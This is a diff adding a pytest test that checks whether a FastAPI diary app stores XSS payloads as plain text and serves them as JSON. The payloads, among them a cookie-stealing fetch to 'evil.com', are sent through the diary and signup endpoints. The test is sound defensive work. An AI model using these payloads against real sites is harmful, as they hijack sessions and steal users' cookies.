@@ -609,3 +609,185 @@ class TestUserJourney:
             for d in diaries
         )
         assert legitimate_exists
+
+    def test_xss_prevention(self, client: TestClient, create_and_login_user):
+        """
+        Test 5.6: API should prevent Cross-Site Scripting (XSS) attacks.
+
+        Given: An attacker tries to inject malicious scripts through user inputs
+        When: Various XSS payloads are submitted through API endpoints
+        Then:
+          - All malicious scripts are safely stored as plain text
+          - JSON responses are properly encoded
+          - Content-Type headers are correctly set
+          - No script execution can occur when data is retrieved
+          - System remains stable and secure
+        """
+        # Setup: Create test user
+        auth_data = create_and_login_user(
+            email="xsstest@example.com",
+            username="xsstestuser",
+            password="XssTest123!"
+        )
+        token = auth_data["access_token"]
+
+        # Test 1: Basic XSS - Script tag in diary content
+        xss_script_diary = {
+            "content": "<script>alert('XSS Attack!')</script>",
+            "title": "XSS Script Test",
+        }
+        script_response = client.post(
+            "/diary",
+            json=xss_script_diary,
+            headers={"Authorization": f"Bearer {token}"},
+        )
+        assert script_response.status_code == 201
+        created_diary = script_response.json()
+        # Verify content is stored as-is (plain text, not executed)
+        assert created_diary["content"] == xss_script_diary["content"]
+        diary_id_1 = created_diary["id"]
+
+        # Test 2: Image tag with onerror event
+        xss_img_diary = {
+            "content": "<img src=x onerror=alert('XSS')>",
+            "title": "XSS Image Test",
+        }
+        img_response = client.post(
+            "/diary",
+            json=xss_img_diary,
+            headers={"Authorization": f"Bearer {token}"},
+        )
+        assert img_response.status_code == 201
+        assert img_response.json()["content"] == xss_img_diary["content"]
+
+        # Test 3: XSS in title field
+        xss_title_diary = {
+            "content": "Normal content",
+            "title": "<svg onload=alert('XSS')>",
+        }
+        title_response = client.post(
+            "/diary",
+            json=xss_title_diary,
+            headers={"Authorization": f"Bearer {token}"},
+        )
+        assert title_response.status_code == 201
+        assert title_response.json()["title"] == xss_title_diary["title"]
+
+        # Test 4: XSS with HTML entities
+        xss_entities_diary = {
+            "content": "&lt;script&gt;alert('XSS')&lt;/script&gt;",
+            "title": "XSS Entities Test",
+        }
+        entities_response = client.post(
+            "/diary",
+            json=xss_entities_diary,
+            headers={"Authorization": f"Bearer {token}"},
+        )
+        assert entities_response.status_code == 201
+        assert entities_response.json()["content"] == xss_entities_diary["content"]
+
+        # Test 5: XSS with JavaScript protocol
+        xss_js_protocol_diary = {
+            "content": "Click here: <a href='javascript:alert(\"XSS\")'>Link</a>",
+            "title": "JavaScript Protocol Test",
+        }
+        js_protocol_response = client.post(
+            "/diary",
+            json=xss_js_protocol_diary,
+            headers={"Authorization": f"Bearer {token}"},
+        )
+        assert js_protocol_response.status_code == 201
+        assert js_protocol_response.json()["content"] == xss_js_protocol_diary["content"]
+
+        # Test 6: XSS in username during signup
+        xss_signup = {
+            "email": "xssuser@example.com",
+            "username": "<script>alert('XSS')</script>",
+            "password": "XssPass123!",
+        }
+        signup_response = client.post("/auth/signup", json=xss_signup)
+        # Should succeed and store username as plain text
+        assert signup_response.status_code == 201
+        user_data = signup_response.json()
+        assert user_data["username"] == xss_signup["username"]
+
+        # Test 7: Complex XSS payload
+        complex_xss_diary = {
+            "content": """
+                <div>
+                    <script>fetch('http://evil.com?cookie='+document.cookie)</script>
+                    <iframe src="javascript:alert('XSS')"></iframe>
+                    <img src=x onerror="eval(atob('YWxlcnQoJ1hTUycp'))">
+                </div>
+            """,
+            "title": "Complex XSS Test",
+        }
+        complex_response = client.post(
+            "/diary",
+            json=complex_xss_diary,
+            headers={"Authorization": f"Bearer {token}"},
+        )
+        assert complex_response.status_code == 201
+        assert complex_response.json()["content"] == complex_xss_diary["content"]
+
+        # Test 8: Verify Content-Type headers are correct
+        # This prevents browser from interpreting JSON as HTML
+        list_response = client.get(
+            "/diary",
+            headers={"Authorization": f"Bearer {token}"},
+        )
+        assert list_response.status_code == 200
+        # FastAPI should set Content-Type to application/json
+        assert "application/json" in list_response.headers.get("content-type", "").lower()
+
+        # Test 9: Retrieve diary with XSS content
+        detail_response = client.get(
+            f"/diary/{diary_id_1}",
+            headers={"Authorization": f"Bearer {token}"},
+        )
+        assert detail_response.status_code == 200
+        detail_data = detail_response.json()
+        # Verify XSS content is returned as-is (JSON encoded)
+        assert detail_data["content"] == xss_script_diary["content"]
+        # Verify it's JSON, not HTML
+        assert "application/json" in detail_response.headers.get("content-type", "").lower()
+
+        # Test 10: XSS in update operation
+        xss_update = {
+            "content": "<body onload=alert('XSS')>Updated content</body>",
+            "title": "<marquee>XSS Update</marquee>",
+        }
+        update_response = client.put(
+            f"/diary/{diary_id_1}",
+            json=xss_update,
+            headers={"Authorization": f"Bearer {token}"},
+        )
+        assert update_response.status_code == 200
+        updated_data = update_response.json()
+        assert updated_data["content"] == xss_update["content"]
+        assert updated_data["title"] == xss_update["title"]
+
+        # Test 11: Verify all XSS payloads are stored safely
+        final_list = client.get(
+            "/diary",
+            headers={"Authorization": f"Bearer {token}"},
+        )
+        assert final_list.status_code == 200
+        diaries = final_list.json()
+        # Should have multiple diaries with XSS payloads stored as plain text
+        assert len(diaries) >= 5
+
+        # Test 12: XSS with special characters and quotes
+        special_chars_diary = {
+            "content": """<script>alert("XSS with 'quotes' and \"double quotes\"");</script>""",
+            "title": "Special Characters Test",
+        }
+        special_response = client.post(
+            "/diary",
+            json=special_chars_diary,
+            headers={"Authorization": f"Bearer {token}"},
+        )
+        assert special_response.status_code == 201
+        # Verify JSON encoding handles quotes correctly
+        special_data = special_response.json()
+        assert special_data["content"] == special_chars_diary["content"]
